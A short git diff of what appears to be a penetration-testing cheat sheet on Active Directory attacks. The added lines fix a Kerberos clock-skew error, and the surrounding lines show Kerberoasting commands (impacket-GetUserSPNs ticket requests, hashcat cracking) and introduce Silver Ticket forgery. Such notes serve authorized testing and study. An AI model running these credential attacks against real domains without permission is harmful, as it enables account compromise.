@@ -382,6 +382,11 @@ hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
 ```
+Clock skew too great Error
+```
+sudo timedatectl set-ntp off
+sudo rdate -n 10.10.10.100
+```
 #### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.
 
